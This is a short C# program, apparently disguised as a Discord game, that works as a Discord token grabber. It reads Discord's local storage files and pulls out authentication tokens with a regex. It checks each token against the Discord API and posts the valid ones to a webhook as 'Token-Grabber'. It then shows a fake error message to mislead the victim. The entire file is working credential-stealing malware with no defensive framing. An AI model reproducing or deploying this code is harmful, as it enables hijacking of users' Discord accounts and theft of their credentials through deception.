using System;
using System.IO;
using System.Net;
using System.Collections.Specialized;
using System.Text.RegularExpressions;

namespace DiscordGame
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            String Webhook = "";
            String AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            String API_Auth = "https://discordapp.com/api/v6/users/@me";
            String DiscordDB = AppData + @"\Discord\Local Storage\leveldb\";
            String[] Files = Directory.GetFiles(DiscordDB);
            foreach (String CFile in Files)
            {
                try
                {
                    String[] Lines = File.ReadAllLines(CFile);
                    foreach (String Line in Lines)
                    {
                        var RegexPattern = $"\"(" + @"[A-Za-z0-9_\./\\-]){59}" + $"\"";
                        Match Token = Regex.Match(Line, RegexPattern, RegexOptions.IgnoreCase);
                        if (Token.Success)
                        {
                            //Console.WriteLine(Token.Value);
                            var HTTPRequest = (HttpWebRequest)WebRequest.Create(API_Auth);
                            HTTPRequest.ContentType = "application/json; charset=utf-8";
                            HTTPRequest.Method = "GET";
                            HTTPRequest.Headers["Authorization"] = Token.Value.ToString().Trim('"');
                            var HTTPResponce = (HttpWebResponse)HTTPRequest.GetResponse();

                            if (HTTPResponce.StatusCode.ToString() == "OK")
                            {
                                var DiscordWebhookClient = new WebClient();
                                var Data = new NameValueCollection();
                                Data.Add("username", "Token-Grabber");
                                Data.Add("content", Token.Value.ToString().Trim('"'));
                                DiscordWebhookClient.UploadValues(Webhook, Data);
                            }
                        }
                    }
                }
                catch
                {
                }
            }
            Console.WriteLine("Error; System doesn't have correct requirements");
        }
    }
}
